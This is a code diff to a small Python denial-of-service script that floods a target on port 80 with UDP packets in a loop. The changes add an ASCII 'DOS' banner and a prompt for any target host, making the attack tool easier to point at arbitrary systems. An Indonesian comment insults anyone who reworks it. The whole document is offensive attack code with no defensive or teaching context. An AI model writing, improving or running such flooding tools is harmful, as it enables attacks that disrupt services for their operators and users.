@@ -2,6 +2,7 @@
 #jangan di recode ya anak bangsat
 from socket import *
 from asyncio import run
+from pyfiglet import figlet_format
 
 async def dos(HOST: str,PORT: int) -> None:
     with socket(AF_INET,SOCK_DGRAM) as flood:
@@ -13,4 +14,7 @@ async def dos(HOST: str,PORT: int) -> None:
             flood.sendto(proxy,dest)
             print(f"packet dikirimkan ke {dest[0]}")
 
-run(dos("",80))
+if __name__ == "__main__":
+   print(figlet_format("DOS",font="larry3d"))
+   target = input("target host: ")
+   run(dos(target,80))
